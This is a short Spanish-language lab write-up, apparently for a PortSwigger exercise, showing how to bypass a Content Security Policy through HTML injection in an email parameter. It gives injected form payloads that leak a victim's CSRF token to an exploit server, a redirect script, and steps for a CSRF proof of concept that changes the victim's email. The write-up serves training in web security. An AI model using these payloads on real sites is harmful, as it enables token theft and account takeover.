
Podemos hacer referencia del campo del correo desde la URL para ello hacemos lo siguiente:
```html
http://bupsuite.com/my-account?email=prueba
```
Por lo que se puede probar si podemos meter codigo javascript
```
http://bupsuite.com/my-account?email=prueba"><script>alert(1)</script>
```
Todo se ve bien, pero si vemos la consola, podemos ver que hay errores de la CSP

Ahora podemos probar lo siguiente, para salir del contexto del "form"
```html
http://bupsuite.com/my-account?email=prueba"></form>
```
Entonces podemos tratar de enviar un nuevo formulario, pero por el metodo GET
```html
http://bupsuite.com/my-account?email=prueba"></form><form class="login_form" name="myform" action="https://server-exploit-portswigger/exploit" method="GET"><buttom class="buttom" type="submit">Click me</buttom>
```
Con esto, podemos ver el exploit server y ver a nivel de logs, que se tramitar el csrf token 

Entonces desde el exploit server le vamos a mandar la URL maliciosa:

```javascript
<script>
location='http://bupsuite.com/my-account?email=prueba"></form><form class="login_form" name="myform" action="https://server-exploit-portswigger/exploit" method="GET"><buttom class="buttom" type="submit">Click me</buttom>';
</script>
```

Ahora podemos armar un CSRF PoC desde BurpSuite y le añadimos los valores del csrf token del la victima y el correo en cuestion a cambiar




